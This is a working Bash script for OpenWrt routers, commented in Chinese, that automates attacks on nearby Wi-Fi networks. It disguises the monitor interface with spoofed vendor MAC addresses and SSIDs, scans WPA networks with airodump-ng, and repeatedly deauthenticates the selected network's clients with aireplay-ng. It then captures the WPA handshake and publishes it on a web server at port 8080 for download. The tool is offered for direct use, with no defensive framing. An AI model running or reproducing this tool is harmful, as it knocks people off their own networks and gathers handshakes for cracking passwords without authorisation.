#!/bin/bash
#抓包脚本
#============可调整参数================
#修改攻击次数
ac_num=20
#====================================
#定义各种颜色的变量
red='\e[91m' green='\e[92m' yellow='\e[1;33m' magenta='\e[95m' cyan='\e[96m' none='\e[0m'
sys_release=$(awk -F. '/DISTRIB_RELEASE/{print $1}' /etc/openwrt_release | cut -d "'" -f 2)    #获取openwrt系统版本
#定义停留警告界面
Error() {
	read -sp "$(echo -e "\n${red}$*${none}\n")"
}

#定义停留通知界面
Notifi() {
	read -sp "$(echo -e "\n${green}$*${none}\n")"
}

#输出执行成功信息
PrintTrueInfo() {
	echo -e "\n${yellow}$*${none}\n"
}

#输出执行错误信息
PrintFalseInfo() {
	echo -e "\n${red}$*${none}\n"
}

#生成MAC地址文本的函数
MacAddress() {
	[ ! -e /etc/config/scp ] && mkdir -p /etc/config/scp
	cat > /etc/config/scp/ap_mac.txt <<-"EOF"
	TP-LINK^BC:46:99
	CMCC^18:69:DA
	CMCC^50:5D:AC
	CMCC^98:00:6A
	CMCC^D0:59:95
	CMCC^9C:FE:A1
	TP-LINK^B8:F8:83
	TP-LINK^BC:46:99
	CMCC^88:D2:74
	CMCC^0C:6A:BC
	CMCC^8C:60:AD
	HONOR^34:71:46
	HUAWEI^14:77:40
	MERCURY^BC:54:FC
	TP-LINK^48:0E:EC
	TP-LINK^78:44:FD
	TP-LINK^80:EA:07
	TP-LINK^80:8F:1D
	MERCURY^C0:A5:DD
	Xiaomi^28:D1:27
	CMCC^24:CA:CB
	HUAWEI^10:E9:53
	TP-LINK^24:69:68
	TP-LINK^64:6E:97
	TP-LINK^50:BD:5F
	TP-LINK^60:3A:7C
	TP-LINK^F8:8C:21
	Tenda^C8:3A:35
	TP-LINK^BE:A6:15
	Xiaomi^28:6C:07
	TP-LINK^54:75:95
	TP-LINK^DC:FE:18
	MERCURY^1C:60:DE
	Xiaomi^9C:9D:7E
	HUAWEI^54:F2:94
	TP-LINK^B8:F8:83
	MERCURY^50:3A:A0
	Tenda^C8:3A:35
	TP-LINK^74:05:A5
	MERCURY^C0:61:18
	EOF
}

#获取mac地址和名称
GetMacName() { 																																																														  
	[ ! -e /etc/config/scp/ap_mac.txt ] && PrintFalseInfo "没有找到存放ap mac地址的文档，请重新设置安全设置脚本!" && exit #没有找到存放ap的mac地址的文档提示并退出
	get_mac_num=$(cat /etc/config/scp/ap_mac.txt | wc -l)	#获取mac地址的总数量
	[ "${get_mac_num}" == "0" ] && PrintFalseInfo "存放mac地址的文档是空的，这样无法创建热点，正在退出脚本" && exit	#判断mac地址的数量为0的时候提示并退出脚本
	get_random_wei=$(echo ${get_mac_num} | wc -L)   #获取ap的mac地址数量的位数
	if [ "${get_random_wei}" != "1" ];then  #检测位数不是1位的
		num=1
		while :;do
			random_num=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "0123456789"  2>/dev/null | head -c1)  #获取随机数值
			if [[ "${random_num}" != "0" && "${random_num}" -le "${get_random_wei}" ]];then   #判断获取到的实际数值是否超过了ap的mac地址的位数没有则进行赋值。
				random_max="${random_num}"; break
			fi
			[ "${num}" == "100" ] && exit   #循环100次，则退出程序
			let num+=1  #计数
		done
	else    #位数为1位的就赋值为1
		random_max=1
	fi
	num=1	#计数
	while :;do
		getRandomNum=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "0123456789"  2>/dev/null | head -c${random_max})	#获取随机数值，用来到ap文档中提取mac地址
		if [[ "${getRandomNum}" != "0" && "${getRandomNum}" -le "${get_mac_num}" ]];then								#检查获取到的随机数值是否超过了ap总行数，没有则往下进行
			get_name_mac="$(sed -n "${getRandomNum}p" /etc/config/scp/ap_mac.txt | sed -n "1p" )"	#从文档中获取mac地址和名称
			host_name=$(echo "${get_name_mac}" | cut -d '^' -f 1 | sed -n "1p")						#提取名称
			if [ "${host_name}" == "CMCC" ];then
				while :;do
					get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "a-zA-Z0-9"  2>/dev/null | head -c4)	#随机生成最后一段名称
					host_name="${host_name}-${get_last_name}"				#汇总名字
					[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
				done
			elif [ "${host_name}" == "@PHICOMM" ];then
				while :;do
					get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "a-zA-Z0-9"  2>/dev/null | head -c2)	#随机生成最后一段名称
					host_name="${host_name}_${get_last_name}"				#汇总名字
					[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
				done
			else
				while :;do
					get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "A-F0-9"  2>/dev/null | head -c4)		#随机生成最后一段名称
					host_name="${host_name}_${get_last_name}"				#汇总名字
					[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
				done			   
			fi																																																	
			wlan_mac="$(echo "${get_name_mac}" | cut -d '^' -f 2)$(hexdump -n 3 -e '/1 ":%02x"' /dev/urandom  | sed -n "1p")"	#根据AP品牌mac地址前三段，再随机生成后三段，获取mac地址
			[[ ! -z "${host_name}" && ! -z "${wlan_mac}" && "$(echo "${wlan_mac}" | wc -L)" == "17" ]] && break	#检查mac地址没有问题，主机名不是空的就跳出循环。
		fi
		[ "${num}" == "100" ] && exit	#有一百次的机会，到了一百次就退出脚本。
		let num=num+1	#计数器
	done
}

#获取无线网络配置规则的排序最后的数值。
Get_Wifi_Info_Iface_Num() {
	count=0
	while :;do
		if [ "${count}" != "30" ];then  #判断循环是否到30次，到30次就退出循环，这个是做了循环次数限制
			[ -z "$(uci show | grep "wifinet${count}")" ] && Get_Wifi_Info_iface="${count}";break || let count+=1	
		else
			break
		fi
	done
}

#添加监听热点
AddMonitor() {
	#删除系统默认生成的wifi热点，先检测默认热点是否存在，存在则开始删除热点。
	if [ "$(uci show | grep "wireless.default_radio*")" != "" ];then
		num=0	   #定义一个默认的数值0
		while [ ${num} -lt ${wireless_num} ];do
			uci del wireless.default_radio${num}; let num+=1 #删除默认热点
		done
		uci commit wireless #应用无线配置文件
		[ ! -z "$(uci show | grep "wireless.default_radio*")" ] && PrintFalseInfo "没有成功删除系统默认生成的wifi热点"|| PrintTrueInfo "成功删除系统默认生成的wifi热点"
	fi
	select_wireless="$1"; [ -z ${select_wireless} ] && return 1	#接收创建热点的频段数，并检测接收的热点数为空则退出函数，并返回1值
	if [ "${select_wireless}" == "2" ];then #2为2.4G频段，获取2.4G频段无线名称
		test_driver=$(uci show | egrep "\'11g\'|\'2g\'" | cut -d '.' -f 2)  #获取2.4G频段无线名称，如radio0
	elif [ "${select_wireless}" == "5" ];then   #5为5G频段，获取5G频段无线名称
		test_driver=$(uci show | egrep "\'11a\'|\'5g\'" | cut -d '.' -f 2 | sed -n "1p")	#获取5G频段无线名称，如radio0
	elif [ "${select_wireless}" == "6" ];then   #6为第三个频段，默认是5G频段，获取5G频段无线名称
		test_driver=$(uci show | egrep "\'11a\'|\'5g\'" | cut -d '.' -f 2 | sed -n "2p")
	elif [ "${select_wireless}" == "4" ];then   #4为默认单频设备，所以直接复制无线名称就行。
		driver="radio0"
	fi
	if [ ! -z ${test_driver} ];then #判断测试的获取的测试驱动名称，检测是无线驱动是否存在，存在则把无线驱动复制给driver变量中，不存在提示报错信息
		[ ! -z "$(echo ${test_driver} | grep 'radio')" ] && driver=${test_driver} || { PrintFalseInfo "没有找到无线设备 !" ; exit; }
	fi
	[  -z "$(uci show | grep  "wireless.${driver}.country=\'TW\'")" ] && uci set wireless.${driver}.country='TW'  #国家代码不是台湾的，修改为台湾
	GetMacName  #获取伪装mac地址和伪装名称
	if [ "${sys_release}" == "18" ];then	#系统版本为18，直接获取无线网络设置配置
		class_name="$(uci add wireless wifi-iface)" #获取无线网络设置配置
	else
		Get_Wifi_Info_Iface_Num; class_name="wifinet${Get_Wifi_Info_iface}"   #先执行获取无线网络配置数值，然后赋值给变量
	fi
	#创建监听热点================================================>
	uci set wireless.${class_name}=wifi-iface
	uci set wireless.${class_name}.device="${driver}"
	uci set wireless.${class_name}.mode='monitor'
	uci set wireless.${class_name}.ssid="${host_name}${test_name}"
	uci set wireless.${class_name}.network='lan'
	# uci set wireless.${class_name}.disable='1'
	uci set wireless.${class_name}.macaddr="${wlan_mac}"
	uci commit wireless
	# uci delete wireless.${class_name}.disable='1'
	# uci commit wireless
	#<==========================================================
	wifi reload > /dev/null	 #重新加载无线配置
	if [[ ! -z "$(uci show | grep "${host_name}")" && ! -z "$(uci show | grep "${wlan_mac}")" ]];then	#判断监听热点是否创建成功																																													   
		echo -e "\n${yellow}监听热点创建完成 :${none}"
		echo -e "${yellow}监听热点名称: ${host_name}${none}"
		echo -e "${yellow}监听热点MAC: ${wlan_mac}${none}\n"
		uci set wireless.${driver}.disabled='0'; uci commit wireless; wifi reload > /dev/null
	else
		PrintFalseInfo "监听热点没有创建成功"; exit
	fi
}

#获取wifi相关信息
Get_Wifi_Info() {
	PrintTrueInfo "正在扫描无线网络，请等待30秒......" 
	[ -f ./output*.csv ] && rm output*.csv
	[ -f /tmp/output*.csv ] && rm /tmp/output*.csv
	if [ "${sys_release}" == "21" ];then    #判断系统是否是21版本
		test_bga_nac=$(uci show | grep "${driver}.band=" | cut -d "'" -f 2) #系统是21版本的提取频段的规则
	else
		test_bga_nac=$(uci show | grep "${driver}.hwmode=" | cut -d "'" -f 2)   #系统不是21版本的提取频段的规则
	fi
	if [ ! -z "$(iwinfo radio0 info | egrep "bgnac|nac")" ];then    #判断当前频段是否为2.4G和5G在同一个频段上的，如k2p，这样就需要给上全部信道，1-165
		{ airodump-ng -c 1-165 ${Monitor_driver} -w /tmp/output -o csv; } &     #开始扫描周围的WiFi信息，放到后台执行
		PID=$!                                                          #获得获取WiFi信息程序执行ID，方便后期终止程序执行。
	elif [ "$(echo ${test_bga_nac} | egrep '11a|5g')" != "" ];then  #判断是5G的频段，给5G需要的信道就行，36-165
		{ airodump-ng -c 36-165 ${Monitor_driver} -w /tmp/output -o csv; } &    #开始扫描周围的WiFi信息，放到后台执行
		PID=$!                                                          #获得获取WiFi信息程序执行ID，方便后期终止程序执行。
	else                                                                #判断是2G的频段，就不用指定信道了，默认就是扫描2G信号的信道，1-13
		{ airodump-ng ${Monitor_driver} -w /tmp/output -o csv; } &              #开始扫描周围的WiFi信息，放到后台执行
		PID=$!                                                          #获得获取WiFi信息程序执行ID，方便后期终止程序执行。
	fi
	sleep 30; kill -TERM ${PID}; sleep 2         #暂停30秒后终止扫描WiFi的程序。
	[ -e /tmp/zb.txt ] && rm /tmp/zb.txt    #在临时目录中有存放抓包信息的文档，则删除
	[ -e /tmp/_zb.txt ] && rm /tmp/_zb.txt  #在临时目录中有存放抓包信息的临时文档，则删除
    awk -F, '/WPA/{print $1}' /tmp/output-01.csv > /tmp/BSSID.txt   #提取周围WiFi的mac地址，放到对应的文档中
    awk -F, '/WPA/{print $4}' /tmp/output-01.csv > /tmp/Channel.txt #提取周围WiFi的信道，放到对应的文档中
    awk -F, '/WPA/{print $9}' /tmp/output-01.csv > /tmp/Power.txt   #提取周围WiFi的信号强弱，放到对应的文档中
    awk -F, '/WPA/{print $10}' /tmp/output-01.csv > /tmp/beacons.txt    #提取周围WiFi的信号浮标，放到对应的文档中
    awk -F, '/WPA/{print $11}' /tmp/output-01.csv > /tmp/date.txt       #提取周围WiFi的信号数据，放到对应的文档中
    awk -F, '/WPA/{print $14}' /tmp/output-01.csv > /tmp/ESSID.txt      #提取周围WiFi的名称，放到对应的文档中
	sed -i "s/^\ //g;s/^$/uknow/g;s/ /\^\&/g" /tmp/ESSID.txt            #处理WiFi名称中带有空格的，和隐藏网络
	sed -i "s/ //g" /tmp/date.txt /tmp/beacons.txt /tmp/Channel.txt /tmp/Power.txt  #处理所有文档中有空格的
	cat /tmp/output-01.csv | grep -v 'WPA' > /tmp/Station.txt   #提取WiFi网络的客户端信息
	num=1
	while :;do  #循环处理获取到的WiFi信息
		BSSID="$(sed -n "${num}p" /tmp/BSSID.txt)"    #逐行获取每个WiFi的MAC地址
		Channel="$(sed -n "${num}p" /tmp/Channel.txt)"  #逐行获取每个WiFi的信道
		Power="$(sed -n ${num}p /tmp/Power.txt)"        #逐行获取每个WiFi的信号
		beacons="$(sed -n ${num}p /tmp/beacons.txt)"    #逐行获取每个WiFi的浮标
		date="$(sed -n ${num}p /tmp/date.txt)"		    #逐行获取每个WiFi的走的数据
		ESSID="$(sed -n ${num}p /tmp/ESSID.txt)"        #逐行获取每个WiFi的名称
		[ -z ${BSSID} ] && break                        #获取到的WiFi名称为空的话，退出循环
		if [ ! -z "$(cat /tmp/Station.txt | grep ${BSSID})" ];then
            Station_tmp=$(awk -F, '/'${BSSID}'/{print $1}' /tmp/Station.txt | sed -n '1p')  #处理每个WiFi的客户端信息
			echo -e "\t${Power}\t${BSSID}  ${Channel}\t${beacons}\t${date}\t${ESSID}\t\t${Station_tmp}" >> /tmp/_zb.txt #获取到的带有客户端的WiFi信息追加到临时文档中。
		else
			echo -e "\t${Power}\t${BSSID}  ${Channel}\t${beacons}\t${date}\t${ESSID}" >> /tmp/_zb.txt   #获取到没有客户端的WiFi信息追加到临时文档中。
		fi
		let num+=1	
	done
	sort -n -k 2 -t - /tmp/_zb.txt |awk '{print NR "" $0}' >/tmp/zb.txt; wifi_num=$(cat /tmp/BSSID.txt | wc -l)	    #排序 wifi追加到文档中, 获取WiFi的总数量
}

#删除监听热点
DeleteMonitor() {
    del_ap=$(uci show | awk -F. '/'${wlan_mac}'/{print $1"."$2}')   #获取监听热点的配置规则
	[ -z ${del_ap} ] && PrintFalseInfo "没有检测到监听热点" && return 1 #判断没有监听热点退出函数
	uci delete ${del_ap}    #删除监听热点
    #判断监听热点是否删除成功
	[ -z "$(uci show | grep "${wlan_mac}")" ] && PrintTrueInfo "监听热点${host_name}删除完成" || PrintFalseInfo "监听热点${host_name}没有删除完成，可手动删除监听热点"
	uci commit wireless; wifi reload > /dev/null    #应用无线配置文件和重新加载无线
}

#菜单
Menu() {
	while :;do
		[ ! -e /tmp/zb.txt ] && PrintFalseInfo "没有找到zb.txt文档" && return 1 #判断信息
		clear
		echo -e "${yellow}No.\tPower\tBSSID\t\tChannel\tBeacons\tDate\tESSID\t\tStation${none}" #输出标题
		cat /tmp/zb.txt | sed 's/\^\&//g'; echo ""  #显示WiFi信息
		echo -en "\033[?25h${magenta}请选择要抓包WiFi的序列号【1-${wifi_num}】，重新扫描【s】，退出【q】\n请按提示输入：${none}"; read select_num   #等待用户输入
		[ -z "${select_num}" ] && Error "输入为空，回车后重新输入" && continue  #输入为空提示用户重新输入
		if [ "${select_num}" == "s" ];then  #s为重新扫描周围的WiFi信息
			Get_Wifi_Info; continue #获取周围WiFi信息并重新执行循环
		elif [ "${select_num}" == "q" ];then    #q退出程序，并开始删除热点、开启网卡无线功能、终止程序
			DeleteMonitor; EnabledWifi; CleanKill; exit 
		elif [[ "${select_num}" -gt "${wifi_num}" || "${select_num}" -lt "0" ]];then
			Error "输入的数值超出范围，请按照提示的范围输入序列号"; continue
		fi
		Bsid="$(sed -n "${select_num}p" /tmp/zb.txt | awk '{print $3}')"  #获取选择的WiFi的mac地址
		Chanel="$(sed -n "${select_num}p" /tmp/zb.txt | awk '{print $4}')"  #获取选择的WiFi的信道
		Esid="$(sed -n ${select_num}p /tmp/zb.txt | awk '{print $7}')"      #获取选择的WiFi的名称
		Station="$(sed -n ${select_num}p /tmp/zb.txt| awk '{print $8}')"    #获取选择的WiFi的客户端
		[ -z ${Bsid} ] && Error "没有提取到WiFi的mac地址，重新选择一下吧" && continue  #获取的WiFimac地址为空重新选择
		PrintTrueInfo "已选择【${Esid}】"; sleep 1; break       #输出选择的WiFi名称，并退出循环
	done	
}

#检测监听热点删除监听热点
CheckMonitor() {
	while :;do
		monitor_name="$(uci show | grep 'monitor' | cut -d '.' -f 1,2)" #获取监听热点
		[ -z "${monitor_name}" ] && PrintTrueInfo "监听热点清理完成" && return 0	#获取监控热点的变量为空则清理完成，退出循环
		for i in ${monitor_name}	   #有监控热点循环删除监控热点	 
		do
			uci delete $i	   #删除监控热点
		done
		uci commit wireless; wifi reload > /dev/null	#监控热点删除后，应用无线配置和WiFi重新加载。
	done
	sleep 1
}

#检测抓到的握手包信息
CheckHandshake() {
	num_while=1
	while :;do
		if [[ -f /tmp/cap/tmp_1-01.cap ]];then  #存在生成的抓包文件，则往下执行
			{ aircrack-ng /tmp/cap/tmp_1-01.cap > /tmp/packe_if.log; } &	#后台执行检测握手包信息
			AIR_PID=$! ; sleep 4   #并获取执行的id
			[ ! -z ${AIR_PID} ] && kill -9 ${AIR_PID} &>/dev/null   #终止检测命令
			[ "$(cat /tmp/packe_if.log | grep -a 'Killedg packets')" != "" ] && let num_while+=1    #检测到‘Killedg packets’计数一次
			if [ "${num_while}" == "20" ];then  #检测到‘Killedg packets’20次的时候，删除相关配置，还有终止检测的命令，再重新开始检测
				killall -2 airodump-ng &>/dev/null; rm -rf /tmp/cap/tmp_1-01*
		        GrabPack&		#开始执行抓包，放到后台执行
				air_pid=$!   	#获取执行id
				[ ! -z ${air_pid} ] && kill -2 ${air_pid}   #终止抓包程序
				num_while=1
			fi
		fi
	done
}

#抓包
GrabPack() {
	airodump-ng --bssid ${Bsid} -w /tmp/cap/tmp_1 -c ${Chanel} ${Monitor_driver} &  
	ZPID=$!
}

#清理抓包产生的临时文件和终止程序
CleanKill() {
	[ ! -z ${ZPID} ] && kill -TERM ${ZPID} &>/dev/null
	[ ! -z ${CPID} ] && kill -TERM ${CPID} &>/dev/null
	[ ! -z ${CHSK} ] && kill -TERM ${CHSK} &>/dev/null
	[ ! -z ${air_pid} ] && kill -TERM ${air_pid} &>/dev/null  
	killall -9 airodump-ng &>/dev/null; killall -9 aircrack-ng &>/dev/null; killall -9 aireplay-ng &>/dev/null
	rm -rf /tmp/cap/tmp_1-01*
}

#清理内存
CleanMem() {
	echo 1 > /proc/sys/vm/drop_caches; echo 2 > /proc/sys/vm/drop_caches; echo 3 > /proc/sys/vm/drop_caches
}

#攻击wifi网络
AccuseWifi() {
	[ ! -e /tmp/cap ] && mkdir -p /tmp/cap  #不存在存放握手包的cap目录，则创建
	[ ! -L /cap/cap ] && ln -s /tmp/cap /cap    #没有把/cap软链接到/tmp/cap目录上，则创建软链接
	[ -f /tmp/packe_if.log ] && rm -rf /tmp/packe_if.log    #判断是否抓到包的文档存在，则删除
	echo 1 /proc/sys/vm/drop_caches &>/dev/null; PrintTrueInfo "可按任意键退出抓包程序"    #清理内存+显示信息
	sleep 2; GrabPack&  #抓包，放到后台执行。
	air_pid=$!  #后去执行抓包程序的id号
	if [[ "$(echo "${Esid}" | sed 's/[-,0-9,a-z,A-Z,_,@]//g')" != "" ]];then    #判断WiFi名称中是否有高位字符的
		Esid="$(echo ${Bsid} | sed 's/:/-/g')"  #处理一下WiFi的mac地址作为WiFi名称显示出来
	fi
	Crack&	#攻击客户端，放到后台执行
	CPID=$! #记录执行的id号
	CheckHandshake&	#检查是否抓到握手包，放到后台执行
	CHSK=$!   #记录执行的id号
	num_ll=0
	while :;do
		if [[ -f /tmp/packe_if.log && "$(cat /tmp/packe_if.log 2>/dev/null | grep -a "1 handshake")" != "" ]];then  #抓包握手包
			[ -e /tmp/cap/tmp_1-01.cap ] && mv /tmp/cap/tmp_1-01.cap /tmp/cap/"${Esid}".cap #把临时生成的握手包文件，重命令为WiFi名称
			CleanKill;clear #清理程序和清屏
			echo -e "\n\n${yellow}* * *已经抓到${Esid}握手包* * *${none}\n" && test -e /tmp/running.txt && rm /tmp/running.txt
			echo -e "\n${yellow}抓到的握手包在这个网址中，请单击下面的网址导出握手包\n\nhttp://${ip_address}:8080${none}/cap/${Esid}.cap\n"
			echo "";read -sp "$(echo -e "${green}回车后继续抓包${none}")"
			CleanMem;break  #清理内存，并退出循环
		fi
		read -t 1 -n 1 selct_q  #停留一秒钟，等待输入任意键退出
		if [ "$?" == "0" ];then #检测到用户输入任意键，开始停止抓包
			[ "${selct_q}" == "d" ] && rm -rf /tmp/cap/*    #检测输入的是d，则清理抓包的握手包
			PrintTrueInfo "正在退出抓包. . ."
			CleanKill; CleanMem; break  #清理程序和内存
		fi
	done
}

# 掉线攻击
Crack(){
	client_mac= 	#定义存放客户端的变量
	count=0 #计数变量
	while :;do
        [ $count -ge 4 ] && break   #循环超过4次退出循环。
		[[ -z "${Bsid}" || -z "${Esid}" || -z "${Monitor_driver}" ]] && Error "没有获取到WiFi的名称|mac地址|驱动名称，无法攻击重新选择一下WiFi" && return 1
		if [[ -e /tmp/cap/tmp_1-01.csv ]];then  #检测存在获取WiFi信息保存的文档
			client_mac="$(cat /tmp/cap/tmp_1-01.csv | grep ${Bsid} | grep -v CCMP | cut -d ',' -f 1)"   #获取WiFi家的客户端mac地址
			if [[ -z "${client_mac}" ]];then    #没有获取到，使用变量中提取出来的一个客户端mac地址
				[ ! -z "${Station}" ] && client_mac=${Station} || client_mac=
			fi
		else    #不存在使用变量中获取到的一个客户端信息
			[ ! -z "${Station}" ] && client_mac=${Station} || client_mac=
		fi
		sleep 1
		for i in ${client_mac};do   #循环处理获取到的客户单mac地址
			if [[ -f /tmp/cap/tmp_1-01.cap ]];then  #存在抓包生成的握手包文件，则开始执行攻击
				[[ -f /tmp/packe_if.log && "$(cat /tmp/packe_if.log | grep -a "1 handshake")" != "" ]] && sleep 2 && return 0  #检测抓到握手包退出循环
				aireplay-ng -0 ${ac_num} -a ${Bsid} -c ${i} ${Monitor_driver} --ignore-negative-one &>/dev/nul  #攻击WiFi家的客户端
				killall aireplay-ng &>/dev/null; sleep 20 #攻击完，终止程序，暂停20秒	
			else    #不存在退出循环
				break
			fi
			sleep 1
		done
		CleanMem; sleep 1   #清理内存，暂停1秒
	done 
}

#显示信息
PrintRamSmall() {
	clear; PrintFalseInfo "检测内存不足，请把握手包导出来，避免路由器死机丢失抓到的握手包"
	echo -e "${yellow}抓到的握手包在下面的网址中，请单击下面的网址导出抓到的握手包,\
\n  握手包导出来后， 输入【d】后脚本会清理抓到的握手包
	\n\n\thttp://${ip_address}:8080${none}/cap${none}"
}

#监控内存大小
MonitorRam() {
	while :;do
		#检测内存剩余大小
		ram_free="$(awk '/MemFree/{print $2}' /proc/meminfo)"   #获取内存剩余的多少，单位为kb
		let ram_free/=1024  #把内存剩余空间换算为MB
		[ ${ram_free} -le 10 ] && { clear; CleanKill; CleanMem; PrintRamSmall; }	#当内存小于等于10MB就开始，终止抓包程序，清理内存，提示内存不足
	done
}

#关闭网卡无线功能
DisabledWifi() {
    wireless_num=$(uci show | grep wireless.radio[0,1]=wifi | wc -l)    #获取频段数量
    count=0 num=1 #定义一个频段数的变量和计数变量
    while [ ${count} -lt ${wireless_num} ];do   #根据频段数进行循环，当大于频段数退出循环
        uci set wireless.radio${count}.disabled='1' #设置禁用网卡无线功能
        uci commit wireless; wifi reload > /dev/null    #应用无线和重新加载无线配置
        if [ "$(uci get wireless.radio${count}.disabled)" != "1" ];then #判断无线供能是否禁用成功，只有5次机会，到了5次就不禁用了。
            let num+=1
            [ "${num}" != "5" ] && continue
        fi
        let count+=1;num=1
    done
}

#启用网卡无线功能
EnabledWifi() {
    wireless_num=$(uci show | grep wireless.radio[0,1]=wifi | wc -l)    #获取频段数量
    count=0 num=1 #定义一个频段数的变量和计数变量
    while [ ${count} -lt ${wireless_num} ];do   #根据频段数进行循环，当大于频段数退出循环
        uci set wireless.radio${count}.disabled='0' #设置启用网卡无线功能
        uci commit wireless; wifi reload > /dev/null    #应用无线和重新加载无线配置
        if [ "$(uci get wireless.radio${count}.disabled)" != "0" ];then #判断无线供能是否启用成功，只有5次机会，到了5次就不启用了。
            let num+=1
            [ "${num}" != "5" ] && continue
        fi
        let count+=1;num=1
    done
}

#nginx配置
NginxConfig() {
	if [[ ! -f /etc/nginx/conf.d/autoindex.conf || -z "$(grep 8080 /etc/nginx/conf.d/autoindex.conf &>/dev/null)" ]];then   #判断系统没有创建导出握手包的配置，则创建一份，创建了就不用创建。
		[ ! -e /etc/nginx/conf.d ] && mkdir -p /etc/nginx/conf.d    #判断没有nginx配置目录，则创建配置文件
		[ ! -e /cap ] && mkdir /cap                                 #判断/目录下没有cap目录，则创建一份cap目录
		cat > /etc/nginx/conf.d/autoindex.conf <<-EOF               #添加配置文件。
		server {
		    listen 8080;
		    server_name  localhost;
		    root /cap;
		    autoindex on;
		}
		EOF
		/etc/init.d/nginx restart	#重启nginx配置文件
	fi
}

#uhttpd配置文件
UhttpdConfig() {
	if [ -z "$(grep "uhttpd 'cap'" /etc/config/uhttpd)" ];then  #判断uhttpd配置文件中没有设置过导出握手包设置，则开始设置
		[ ! -e /cap ] && mkdir /cap         #/目录下没有cap目录，则创建cap目录
echo "
config uhttpd 'cap'										   
list listen_http		0.0.0.0:8080								 
option home			 '/cap'" >> /etc/config/uhttpd  #追加配置文件
		/etc/init.d/uhttpd restart      #重启nginx配置文件
	fi
}

# #检测系统是否有抓包工具
# if [[ "$(opkg list | grep -a aircrack-ng)" == "" ]]
# then
#	 echo -e "${red}系统中没有检测到有抓包工具“aircrack-ng”，安装抓包工具才可以执行脚本${none}" && exit
# fi


#挂载NFS设置
MountNfs() {
	client_ip=$(export | grep 'SSH_CLIENT' | cut -d "'" -f 2 | awk '{print $1}')		#获取客户端的IP地址
	[ -z ${client_ip} ] && PrintFalseInfo "没有检测到客户端登录的IP地址" && exit			#没有获取到客户端的IP地址则提示用户并退出
	[ "$(mount -l | grep ${client_ip})" != "" ] && return 0							 #检测已经挂在nfs盘，就不往下进行了，则退出此次函数
	while :;do
		clear
		echo "";echo -en "${magenta}请输入挂载的盘符和对应的目录，如：【a/seek】【按q退出】：${none}"; read disk_path  #等待用户输入挂载盘nfs盘符和目录名称
		[[ "${disk_path}" == "q" ]] && exit #检测输入的是q是退出脚本。
		[ -z "${disk_path}" ] && Error "输入为空，请重新输入" && continue   #输入为空则提示用户并重新执行。
		mount -t nfs ${client_ip}:/${disk_path} /mnt -o nolock		  #挂载nfs共享盘
		[ "$?" != "0" ] && Error "磁盘没有挂载成功，请重新输入磁盘" || break	#检测挂载命令返回值，返回值不为0没有挂载成功提示并重新循环，为0挂载成功，退出循环。
	done
}

#检测抓包脚本依赖的软件是否存在
CheckSoftware() {
	[ ! -f /usr/bin/aircrack-ng ] && Error "系统中没有找到抓包工具，请安装抓包工具“aircrack-ng”工具然后执行抓包脚本。" && exit
}

#找无线驱动名称
CheckWirless() {
	count=1
	while :;do
		PrintTrueInfo "正在等待配置生效，请等待5秒. . ."; sleep 5
		test_mac=$(echo ${wlan_mac} | sed "s/:/-/g" | tr '[a-z]' '[A-Z]')   #处理mac地址，把:替换成-，小写字母改成大写字母
		Monitor_driver=$(ifconfig | grep -i "${test_mac}" | awk '{print $1}')	   #提取mac地址
		let count+=1	#循环一次运算相加一次
		[[ ${count} == 10 && -z ${Monitor_driver} ]] && read -sp "没有获取到无线驱动名称" && exit   #有10次机会，到10次机会没有找到创建的监听热点mac地址，证明热点没有创建成功则退出程序
		[ ! -z "${Monitor_driver}" ] && break #当找到驱动后退出循环。
		PrintFalseInfo "没有获取到无线驱动名称,正在重新尝试. . ."
	done
}

#主要程序===============================================>
CheckSoftware   #检测抓包脚本依赖的软件是否存在
CleanKill	   #清理抓包产生的临时文件和终止程序
CheckMonitor	#检测监听热点删除监听热点
CleanMem		#清理内存
# MountNfs	 #挂在nfs盘符
[ ! -e /etc/config/scp/mac.txt ] && MacAddress  #检测存放AP的mac地址文档不存在，执行生成mac地址文档的函数。
wireless_num=$(uci show | grep wireless.radio[0,1,2]=wifi | wc -l)	  #获取当前路由器的频段数量，如，单频、双频、三频
[[ -z ${wireless_num} ]] && PrintFalseInfo "没有检测到无线频段，请检查无线是否正常" && exit #检测到无线数量为空，则提示用户并退出脚本
if [ "${wireless_num}" == "1" ];then
	AddMonitor 4; PrintTrueInfo "正在等待配置生效. . ."; sleep 5; CheckWirless
elif [ ! -z "$(echo ${wireless_num} | egrep '2|3')" ];then
	while :;do
		clear
		#显示菜单======================>
		PrintTrueInfo "选择抓包的频段"
		PrintTrueInfo "1、抓取2.4G频段的包"
		PrintTrueInfo "2、抓取5G频段的包"
		[[ "${wireless_num}" == "3" ]] &&PrintTrueInfo "3、抓取另一个5G频段的包"
		#<=============================
		echo -en "\033[?25h${magenta}请选择输入序列号【按q退出】：${none}";read select_packe	#等待用户输入
		[[ "${select_packe}" == "q" ]] && exit  #输入为q的时候退出程序
		if [ "${select_packe}" == "1" ];then
			AddMonitor 2; CheckWirless		  #创建监听热点和检测创建的监听热点
		elif [ "${select_packe}" == "2" ];then
			AddMonitor 5; CheckWirless		  #创建监听热点和检测创建的监听热点
		elif [ "${select_packe}" == "3" ];then
			AddMonitor 6; CheckWirless		  #创建监听热点和检测创建的监听热点
		else
			Error "请按照提示输入"; continue
		fi
		break
	done
fi
#获取ip地址
ip_address="$(uci get network.lan.ipaddr)"
MonitorRam&	 #监控内存，放到后台执行，发现内存不足就自动清理
#判断路由器的网页服务器类型
if [ -e /etc/nginx ];then   #判断Nginx是否存在，存在使用nginx作为到处握手包用的网页服务器程序
	NginxConfig
elif [ -f /etc/config/uhttpd ];then #判断Nginx不存在，uhttps存在，存在使用uhttps作为到处握手包用的网页服务器程序
	UhttpdConfig	
else
	PrintFalseInfo "没有找到网页服务器" && exit
fi
Get_Wifi_Info    #获取周围WiFi信息
while :;do
	Menu; AccuseWifi; CleanMem		#选择WiFi网络菜单，攻击无线网络，清理内存
done
#<==================================================